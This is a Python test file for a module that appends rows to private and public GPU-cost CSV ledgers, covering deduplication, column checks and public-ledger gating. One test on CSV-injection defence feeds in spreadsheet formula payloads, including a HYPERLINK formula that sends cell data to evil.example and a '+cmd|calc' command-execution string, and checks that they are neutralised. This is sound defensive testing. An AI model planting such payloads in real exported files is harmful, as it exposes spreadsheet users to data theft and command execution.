"""kit/modalledger.py and `kit run modal-row`: one row per key, columns from the ledger's header, the public ledger
only behind its flag and only for a generic row."""
import contextlib
import csv
import io
import json
from pathlib import Path
import tempfile
import unittest

from kit import cli, modalledger as ML

PRIVATE = ("date_time_et,lane_branch,purpose,app_id,gpu_type,gpu_count,gpu_seconds,cpu_seconds,est_cost_usd,"
           "actual_cost_usd_if_known,cumulative_usd,notes\n"
           '2026-10-09 06:48 ET,some/branch,an old job,ap-old,L4,1,249,4892,0.9,0.26596645,0.26596645,"hand, written"\n')
PUBLIC = ("date_time_et,purpose,gpu_type,gpu_count,gpu_seconds,cpu_seconds,est_cost_usd,actual_cost_usd_if_known,"
          "cumulative_usd,notes\n")
ROW = {"date_time_et": "2026-10-16 08:00 ET", "lane_branch": "grok/x", "purpose": "generic smoke run",
       "app_id": "ap-new", "gpu_type": "L4", "gpu_count": 1, "gpu_seconds": 10, "cpu_seconds": 80,
       "est_cost_usd": 0.0123, "notes": "a note"}


def rows(path):
    with open(path, newline="", encoding="utf-8") as fh:
        return list(csv.DictReader(fh))


class ModalLedgerTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.d = Path(self.tmp.name)
        self.priv, self.pub = self.d / "private.csv", self.d / "public.csv"
        self.priv.write_text(PRIVATE, encoding="utf-8")
        self.pub.write_text(PUBLIC, encoding="utf-8")

    def tearDown(self):
        self.tmp.cleanup()

    def test_one_row_per_key_and_per_app_id(self):
        self.assertTrue(ML.append(self.priv, ROW, "job:1"))
        self.assertFalse(ML.append(self.priv, ROW, "job:1"))                       # the same key again
        self.assertFalse(ML.append(self.priv, {**ROW, "app_id": "ap-old"}, "job:2"))  # a hand-written row's app
        self.assertTrue(ML.append(self.priv, {**ROW, "app_id": ""}, "job:10"))     # job:1 is not a prefix match
        got = rows(self.priv)
        self.assertEqual(len(got), 3)
        self.assertEqual(got[0]["notes"], "hand, written")                         # earlier rows as they were
        self.assertEqual(got[1]["notes"], "a note; autoledger job:1")
        self.assertEqual((got[1]["est_cost_usd"], got[1]["actual_cost_usd_if_known"]), ("0.0123", ""))
        self.assertTrue(self.priv.read_text(encoding="utf-8").startswith(PRIVATE))

    def test_unknown_columns_and_bad_keys_are_refused(self):
        with self.assertRaises(ML.LedgerRowError):
            ML.append(self.priv, {**ROW, "colour": "red"}, "job:1")
        for key in ("", "a;b", "a\nb"):
            with self.assertRaises(ML.LedgerRowError):
                ML.append(self.priv, ROW, key)
        self.assertEqual(len(rows(self.priv)), 1)

    def test_the_public_ledger_needs_the_flag_and_a_generic_row(self):
        with self.assertRaises(ML.LedgerRowError) as cm:
            ML.append(self.pub, ROW, "job:1")
        self.assertIn("public ledger", str(cm.exception))
        with self.assertRaises(ML.LedgerRowError):
            ML.append(self.pub, ROW, "job:1", public=True, generic=False)
        for word in ("title", "target", "held out", "prereg", "experiment"):
            with self.assertRaises(ML.LedgerRowError):
                ML.append(self.pub, {**ROW, "notes": f"a {word} run"}, "job:1", public=True, generic=True)
        self.assertEqual(rows(self.pub), [])
        self.assertTrue(ML.append(self.pub, ROW, "job:1", public=True, generic=True))
        self.assertFalse(ML.append(self.pub, ROW, "job:1", public=True, generic=True))
        (row,) = rows(self.pub)
        self.assertNotIn("lane_branch", row)
        self.assertNotIn("app_id", row)
        self.assertEqual(row["purpose"], "generic smoke run")

    def test_formula_text_is_neutralised_and_numbers_are_not(self):
        """OWASP CSV injection: a text cell starting with = + - @, a tab or a carriage return gets a leading
        apostrophe; numbers and numeric text such as -0.5 stay as they are."""
        bad = {"purpose": '=HYPERLINK("http://evil.example/?"&A1,"click")', "gpu_type": "@SUM(1+1)",
               "notes": "+cmd|calc", "gpu_count": "-x", "date_time_et": "\t=1", "cpu_seconds": "\r=1"}
        self.assertTrue(ML.append(self.pub, {**ROW, **bad}, "job:1", public=True, generic=True))
        (row,) = rows(self.pub)
        for k, v in bad.items():
            want = ("'" + v).replace("\r", "\n") + ("; autoledger job:1" if k == "notes" else "")
            self.assertEqual(row[k], want, k)
        nums = {"est_cost_usd": -0.5, "gpu_seconds": -3, "cpu_seconds": "-0.5", "gpu_count": "+2",
                "actual_cost_usd_if_known": "-1.5e-3", "cumulative_usd": "12"}
        self.assertTrue(ML.append(self.pub, {**ROW, **nums}, "job:2", public=True, generic=True))
        row = rows(self.pub)[1]
        self.assertEqual([row[k] for k in nums], ["-0.5", "-3", "-0.5", "+2", "-1.5e-3", "12"])

    def test_committed_ledger_cells_are_written_back_unchanged(self):
        ledger = Path(__file__).resolve().parents[1] / "docs" / "compute" / "modal-ledger.csv"
        with open(ledger, newline="", encoding="utf-8") as fh:
            cells = [c for r in csv.reader(fh) for c in r]
        for c in cells + ["-0.5", "0.26596645", "-12", "+3", "1e-5", "hand, written", ""]:
            self.assertEqual(ML._cell(c), c)

    def test_command_line(self):
        spec = self.d / "row.json"
        spec.write_text(json.dumps({"key": "job:1", "row": ROW, "generic": True}), encoding="utf-8")
        out = io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(cli.main(["run", "modal-row", str(spec), "--ledger", str(self.priv)]), 0)
            self.assertEqual(cli.main(["run", "modal-row", str(spec), "--ledger", str(self.priv)]), 0)
            self.assertEqual(cli.main(["run", "modal-row", str(spec), "--ledger", str(self.pub)]), 2)
            self.assertEqual(cli.main(["run", "modal-row", str(spec), "--ledger", str(self.pub),
                                       "--public-generic"]), 0)
            spec.write_text(json.dumps({"key": "job:2", "row": ROW}), encoding="utf-8")       # not generic
            self.assertEqual(cli.main(["run", "modal-row", str(spec), "--ledger", str(self.pub),
                                       "--public-generic"]), 2)
            spec.write_text("[1]", encoding="utf-8")
            self.assertEqual(cli.main(["run", "modal-row", str(spec), "--ledger", str(self.priv)]), 2)
        self.assertIn("row added", out.getvalue())
        self.assertIn("already holds this row", out.getvalue())
        self.assertEqual((len(rows(self.priv)), len(rows(self.pub))), (2, 1))


if __name__ == "__main__":
    unittest.main()
